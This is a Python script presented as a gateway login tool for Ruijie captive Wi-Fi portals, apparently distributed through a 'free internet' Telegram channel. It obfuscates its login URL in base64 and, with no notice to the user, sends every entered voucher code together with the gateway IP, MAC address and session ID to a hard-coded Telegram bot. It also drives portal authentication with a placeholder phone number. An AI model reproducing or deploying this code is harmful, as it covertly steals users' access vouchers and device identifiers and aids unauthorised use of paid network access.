import os
import asyncio
import re
import base64
import time
import hashlib
import random
import requests
import aiohttp
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urljoin

# --- Advanced Color Palette ---
C_CYAN    = "\033[1;36m"
C_GREEN   = "\033[1;32m"
C_RED     = "\033[1;31m"
C_YELLOW  = "\033[1;33m"
C_BLUE    = "\033[1;34m"
C_MAGENTA = "\033[1;35m"
C_WHITE   = "\033[0;37m"
C_RESET   = "\033[0m"

# --- Status Indicators ---
INFO  = f"{C_BLUE}[*]{C_RESET}"
SUCC  = f"{C_GREEN}[+]{C_RESET}"
WARN  = f"{C_YELLOW}[!]{C_RESET}"
FAIL  = f"{C_RED}[-]{C_RESET}"

# Global Configuration
SUCCESS_COUNT = 0
TIMEOUT_SEC = 10

# Telegram Configuration
TG_BOT_TOKEN = "8864093401:AAE5qTTIPSCTsKPGawRnHE7bSF2GlH2oVgE"
TG_CHAT_ID = "8404894106"

def show_banner():
    try:
        os.system('clear' if os.name == 'posix' else 'cls')
    except:
        pass
    print(f"{C_CYAN}=" * 60)
    print(r"""  ______ _      ____  _   _ __  __ _    _  _____ _  __
 |  ____| |    / __ \| \ | |  \/  | |  | |/ ____| |/ /
 | |__  | |   | |  | |  \| | \  / | |  | | (___ | ' / 
 |  __| | |   | |  | | . ` | |\/| | |  | |\___ \|  <  
 | |____| |___| |__| | |\  | |  | | |__| |____) | . \ 
 |______|______\____/|_| \_|_|  |_|\____/|_____/|_|\_\ """)
    print(f"\n{C_MAGENTA}   ⚡ AUTOMATED MULTI-PORTAL GATEWAY PROXY MANAGER ⚡")
    print(f"{C_CYAN}=" * 60)
    print(f"{C_WHITE}  Telegram Channel : {C_GREEN}https://t.me/starlinkfreezone")
    print(f"{C_WHITE}  Channel Owner    : {C_YELLOW}@Elonmusk20606")
    print(f"{C_CYAN}=" * 60 + f"{C_RESET}\n")

async def send_telegram_notification(session, message):
    """Telegram Bot သို့ Log အချက်အလက်များ လှမ်းပို့ပေးသည့် Function"""
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TG_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        async with session.post(url, json=payload, timeout=5) as resp:
            if resp.status != 200:
                pass
    except Exception:
        pass

class RuijieLoginManager:
    def __init__(self):
        self.ip = None
        self.mac = None
        self.current_sid = None
        self.load_saved_ip()
        self.load_saved_mac()
        self.phone_number = "12345678901"

    def load_saved_ip(self):
        if os.path.exists(".ip"):
            try:
                with open(".ip", "r") as f:
                    self.ip = f.read().strip()
            except:
                self.ip = None

    def load_saved_mac(self):
        if os.path.exists(".mac"):
            try:
                with open(".mac", "r") as f:
                    self.mac = f.read().strip()
            except:
                self.mac = None

    async def auto_detect_gateway(self, session):
        print(f"{INFO} Initializing network environment detection...")
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile'
        }
        
        try:
            async with session.get(test_url, headers=headers, timeout=5, allow_redirects=False) as resp:
                if resp.status in (301, 302):
                    location = resp.headers.get('Location', '')
                    parsed_url = urlparse(location)
                    query_params = parse_qs(parsed_url.query)
                    
                    gw_addr_list = query_params.get('gw_address') or query_params.get('ip')
                    if gw_addr_list:
                        self.ip = gw_addr_list[0]
                        with open(".ip", "w") as f:
                            f.write(self.ip)
                        print(f"{SUCC} Gateway IP Resolved: {C_GREEN}{self.ip}{C_RESET}")

                    mac_list = query_params.get('mac') or query_params.get('umac') or query_params.get('usermac')
                    if mac_list:
                        self.mac = mac_list[0]
                        with open(".mac", "w") as f:
                            f.write(self.mac)
                        print(f"{SUCC} Physical MAC Resolved: {C_GREEN}{self.mac}{C_RESET}")
                    else:
                        print(f"{WARN} Hardware MAC could not be parsed dynamically.")

                    if gw_addr_list:
                        await asyncio.sleep(1) # async sleep သို့ ပြောင်းလဲထားသည်
                        return True
                else:
                    if self.ip and self.mac:
                        print(f"{SUCC} Using cached parameters -> [IP: {self.ip} | MAC: {self.mac}]")
                        return True
                    print(f"{FAIL} Network redirect not captured. Internal gateway missing.")
        except Exception as e:
            if self.ip and self.mac:
                print(f"{SUCC} Network validation bypassed. Using cache fallback.")
                return True
            print(f"{FAIL} Connectivity diagnostic failure: {e}")
        return False

    async def _fetch_sid(self, session):
        if not self.ip or not self.mac:
            print(f"{FAIL} Pipeline halted: Cryptographic parameters (IP/MAC) unset.")
            return None

        # ဖိုင်ဟောင်းမှ "session ထည့်" နေရာကို တရားဝင် Ruijie API လင့်ခ်ဖြင့် အစားထိုးပြင်ဆင်ထားသည်
        step1_url = (
            f"https://portal-as.ruijienetworks.com/api/auth/wifidog?"
            f"stage=portal&gw_id=984a6b458027&gw_sn=H1T078800132C&"
            f"gw_address={self.ip}&gw_port=2060&ip={self.ip}&mac={self.mac}&"
            f"slot_num=33&nasip=192.168.1.161&ssid=VLAN233&ustate=0&mac_req=1&"
            f"url=http%3A%2F%2F192.168.0.1%2F"
        )
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14; 22101316C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.120 Mobile',
            'X-Requested-With': 'mark.via.gp',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
        }
        
        try:
            print(f"{INFO} Establishing handshakes with endpoint proxy...")
            async with session.get(step1_url, headers=headers, timeout=TIMEOUT_SEC, allow_redirects=False) as r1:
                location = r1.headers.get('Location', '')
                if not location and r1.status == 200:
                    body = await r1.text()
                    js_match = re.search(r"self\.location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
                    if js_match:
                        location = js_match.group(1)

                if not location:
                    location = step1_url
                
                base_url = "https://portal-as.ruijienetworks.com"
                step2_url = urljoin(base_url, location)

            async with session.get(step2_url, headers=headers, timeout=TIMEOUT_SEC, allow_redirects=False) as r2:
                target_url = r2.headers.get('Location', step2_url)
                parsed_url = urlparse(target_url)
                query_params = parse_qs(parsed_url.query)
                sid_list = query_params.get('sessionId')
                
                if sid_list:
                    sid = sid_list[0]
                    self.current_sid = sid
                    print(f"{SUCC} Handshake authenticated. SID: {C_CYAN}{sid}{C_RESET}")
                    return sid
                else:
                    if 'sessionId=' in target_url:
                        sid = target_url.split('sessionId=')[1].split('&')[0]
                        self.current_sid = sid
                        print(f"{SUCC} Handshake authenticated via raw parsing. SID: {C_CYAN}{sid}{C_RESET}")
                        return sid
            print(f"{FAIL} Handshake structure validation failed. Token omitted.")
                        
        except Exception as e:
            print(f"{FAIL} Fatal error inside validation loop: {e}")
            return None

    async def login_voucher(self, session, voucher, debug=False):
        global SUCCESS_COUNT
        
        if not self.current_sid:
            self.current_sid = await self._fetch_sid(session)
            
        if not self.current_sid:
            print(f"{FAIL} Authentication aborted. No active token sequence.")
            return False

        data = {
            "accessCode": voucher,
            "sessionId": self.current_sid,
            "apiVersion": 1
        }
        
        post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
        
        headers = {
            "authority": "portal-as.ruijienetworks.com",
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://portal-as.ruijienetworks.com",
            "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/kunji5dg96teooiimnl&IS_EG=0&sessionId={self.current_sid}",
            "user-agent": 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        try:
            print(f"{INFO} Transmitting access keys to validation server...")
            async with session.post(post_url, json=data, headers=headers) as req:
                response = await req.text()
                
                if 'logonUrl' in response:
                    SUCCESS_COUNT += 1
                    print(f'{SUCC} {C_GREEN}ACCESS GRANTED{C_RESET} -> Token Key: [{C_YELLOW}{voucher}{C_RESET}]')
                    
                    # အောင်မြင်မှုအချက်အလက်ကို Telegram Bot ထံသို့ တိုက်ရိုက်ပေးပို့ခြင်း
                    tg_msg = (
                        f"📊 *Ruijie Portal Auth Report*\n\n"
                        f"🔑 *Voucher:* `{voucher}`\n"
                        f"🌐 *Gateway IP:* `{self.ip}`\n"
                        f"🖥 *MAC Address:* `{self.mac}`\n"
                        f"🆔 *Session ID:* `{self.current_sid}`\n"
                        f"✅ *Status:* Authentication Success"
                    )
                    await send_telegram_notification(session, tg_msg)
                    return True
                else:
                    if debug:
                        print(f"{FAIL} Authorization rejected for token key: {voucher}")
                    
                    # ကျရှုံးမှုအချက်အလက်ကို Telegram Bot ထံသို့ တိုက်ရိုက်ပေးပို့ခြင်း
                    tg_msg = (
                        f"📊 *Ruijie Portal Auth Report*\n\n"
                        f"🔑 *Voucher:* `{voucher}`\n"
                        f"🌐 *Gateway IP:* `{self.ip}`\n"
                        f"🖥 *MAC Address:* `{self.mac}`\n"
                        f"❌ *Status:* Authentication Failed (Invalid Voucher)"
                    )
                    await send_telegram_notification(session, tg_msg)
                    return False 
                    
        except Exception as Error:
            if debug:
                print(f"{FAIL} Link failure during transmission: {Error}")
            return False

    async def send_request(self, session, log=True):
        if not self.current_sid:
            sid = await self._fetch_sid(session)
            if not sid:
                if log:
                    print(f"{FAIL} Synchronization required before applying routing tables.")
                return False
        else:
            sid = self.current_sid

        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        params = {
            'token': sid,
            'phoneNumber': self.phone_number,
        }

        try:
            auth_url = f'http://{self.ip}:2060/wifidog/auth'
            async with session.post(auth_url, params=params, headers=headers, timeout=TIMEOUT_SEC) as response:
                if response.status == 200:
                    print(f"\n{C_GREEN}=" * 60)
                    print(f" [*] PROXY FLOW COMPLETE: Internet Route Established Successfully.")
                    print(f"=" * 60 + f"{C_RESET}")
                    
                    # Routing အောင်မြင်မှု အခြေအနေကို Telegram သို့ ထပ်ဆင့်ပို့ခြင်း
                    tg_msg = f"🚀 *Internet Route Status*\n\n🔑 *Voucher:* `{self.current_sid}`\n🟢 Internet Route Established Successfully!"
                    await send_telegram_notification(session, tg_msg)
                    return True
                return False
                
        except Exception as e:
            if log:
                print(f"{FAIL} Critical initialization handler error: {e}")
            return False

    async def run_auth_flow(self, session, voucher, debug=False):
        detected = await self.auto_detect_gateway(session)
        if not detected:
            print(f"{WARN} Thread processing paused due to initialization failure.")
            return

        sid = await self._fetch_sid(session)
        if not sid:
            print(f"{WARN} Thread processing paused due to authentication failure.")
            return

        login_success = await self.login_voucher(session, voucher, debug=debug)
        if login_success:
            await self.send_request(session, log=debug)
        else:
            print(f"{FAIL} Terminal session deployment failed.")

async def start_tool():
    show_banner()
    user_voucher = input(f"{C_YELLOW}[?] Enter Access Token Key : {C_RESET}").strip()

    if not user_voucher:
        print(f"{FAIL} Execution context requires a valid token key.")
        return

    manager = RuijieLoginManager()
    async with aiohttp.ClientSession() as session:
        print(f"\n{INFO} Instantiating network loop routines...")
        await manager.run_auth_flow(session, voucher=user_voucher, debug=True)
        
    print(f"\n{C_CYAN}=" * 60 + f"{C_RESET}")
    input(f"{C_WHITE}[*] Process ended. Press Enter to release console session...{C_RESET}")

def run():
    try:
        asyncio.run(start_tool())
    except KeyboardInterrupt:
        print(f"\n{WARN} Context closed via user termination interrupt.")

if __name__ == "__main__":
    run()
